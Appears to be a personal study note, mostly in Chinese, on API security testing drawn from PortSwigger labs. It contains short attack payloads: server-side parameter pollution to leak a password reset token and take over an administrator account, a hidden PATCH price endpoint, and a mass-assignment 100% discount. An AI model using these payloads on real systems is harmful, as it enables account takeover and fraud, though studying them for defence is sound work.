APIs (Application Programming Interfaces) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website's confidentiality, integrity, and availability.

All dynamic websites are composed of APIs, so classic web vulnerabilities like SQL injection could be classed as API testing. In this topic, we'll teach you how to test APIs that aren't fully used by the website front-end, with a focus on RESTful and JSON APIs. We'll also teach you how to test for server-side parameter pollution vulnerabilities that may impact internal APIs.

To illustrate the overlap between API testing and general web testing, we've created a mapping between our existing topics and the [OWASP API Security Top 10 2023](https://portswigger.net/web-security/api-testing/top-10-api-vulnerabilities).

## 1. Principle

目标接口限制可绕过

### 1.1. Location

任何存在接口的位置

## 2. Test

### 2.1. API Documentation

API 文档泄露

```
GET /api/
```

### 2.2. Parameter Pollution

在忘记密码功能处找到一个 JS 文件, 发现可通过 Token 重置密码

```
/forgot-password?reset_token=${resetToken}
```

忘记密码, 请求不存在的用户名, 报错 `"error":"Invalid username."` 

```
username=foo
```

请求存在的用户名并添加一个参数, 报错 `"error": "Parameter is not supported."` 

```
username=administrator%26x=y
```

> 说明参数被解析

使用 `#` 截断, 报错 `"error": "Field not specified."` 

```
username=administrator%23
```

> 说明缺少一个 `field` 参数

收集忘记密码功能的参数, 猜测 `field` 的值

```
username=administrator%26field=§foo§%23
```

修改 `field` 的值获取 Token

```
username=administrator%26field=reset_token
```

拼接 Token 以重置密码

```
/forgot-password?reset_token=MY-TOKEN
```

### 2.3. Unused API Endpoint

爆破请求方式发现可以通过隐藏参数修改商品价格

```
PATCH /api/products/1/price HTTP/2
```

### 2.4. Mass Assignment

在一个响应包中找到了一个隐藏参数, 可获得折扣

```
"chosen_discount":{"percentage":100}
```

---

**Refrences**

- [API testing](https://portswigger.net/web-security/api-testing)
- [CWE-475](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-475)

